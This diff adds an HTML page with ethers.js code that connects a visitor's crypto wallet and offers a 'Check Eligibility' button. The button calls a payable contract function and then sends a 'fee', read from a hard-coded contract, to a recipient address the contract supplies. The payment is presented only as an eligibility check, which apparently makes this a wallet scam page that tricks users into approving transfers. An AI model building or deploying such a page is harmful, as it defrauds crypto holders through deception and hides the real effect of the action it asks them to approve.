@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smart Contract Interaction</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            margin-top: 50px;
+        }
+        .button {
+            padding: 10px 20px;
+            margin: 20px;
+            border: none;
+            background-color: #4CAF50;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        .button:hover {
+            background-color: #45a049;
+        }
+        .result {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Interact with Smart Contract</h2>
+        <button id="connectButton" class="button">Connect Wallet</button>
+        <br>
+        <button id="checkEligibilityButton" class="button" style="display:none;">Check Eligibility</button>
+        <div id="result" class="result"></div>
+    </div>
+
+    <!-- تضمين مكتبة ethers.js من رابط CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.6.9/dist/ethers.min.js"></script>
+    <script>
+        let provider;
+        let signer;
+        let contract;
+        const contractAddress = "0x9EBAE9B5b3cf3E39ac371Ff2b8FF769B2C3C1A9A";  // العقد الذكي
+        const contractABI = [
+            {
+                "inputs": [],
+                "name": "checkEligibility",
+                "outputs": [],
+                "stateMutability": "payable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "fee",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "recipient",
+                "outputs": [
+                    {
+                        "internalType": "address payable",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            }
+        ];
+
+        // Connect Wallet Function
+        async function connectWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);  // طلب الوصول إلى الحسابات
+                signer = provider.getSigner();
+                contract = new ethers.Contract(contractAddress, contractABI, signer);
+                document.getElementById('checkEligibilityButton').style.display = 'inline-block';  // عرض الزر للتحقق من الأهلية
+                document.getElementById('connectButton').innerHTML = 'Wallet Connected';
+                document.getElementById('result').innerHTML = 'Wallet connected successfully.';
+            } else {
+                alert('Please install MetaMask');
+            }
+        }
+
+        // Check Eligibility Function
+        async function checkEligibility() {
+            try {
+                // التحقق من الأهلية عبر العقد الذكي
+                const eligibilityResult = await contract.checkEligibility();
+                document.getElementById('result').innerHTML = 'Eligibility check passed!';
+                
+                // إرسال المعاملة بعد التحقق من الأهلية
+                await sendTransaction();
+            } catch (error) {
+                console.error('Eligibility check failed:', error);
+                document.getElementById('result').innerHTML = 'Eligibility check failed.';
+            }
+        }
+
+        // Send Transaction Function
+        async function sendTransaction() {
+            try {
+                const recipientAddress = await contract.recipient(); // الحصول على العنوان المستلم من العقد
+                const fee = await contract.fee(); // الحصول على المبلغ المخصوم من العقد
+                const tx = {
+                    to: recipientAddress,
+                    value: fee
+                };
+
+                // إرسال المعاملة
+                const txResponse = await signer.sendTransaction(tx);
+                document.getElementById('result').innerHTML = 'Transaction sent successfully!';
+                await txResponse.wait();  // الانتظار حتى يتم تأكيد المعاملة
+                alert('Transaction Successful!');
+            } catch (error) {
+                console.error('Transaction failed:', error);
+                document.getElementById('result').innerHTML = 'Transaction failed.';
+            }
+        }
+
+        // Event Listeners
+        document.getElementById('connectButton').addEventListener('click', connectWallet);
+        document.getElementById('checkEligibilityButton').addEventListener('click', checkEligibility);
+    </script>
+</body>
+</html>
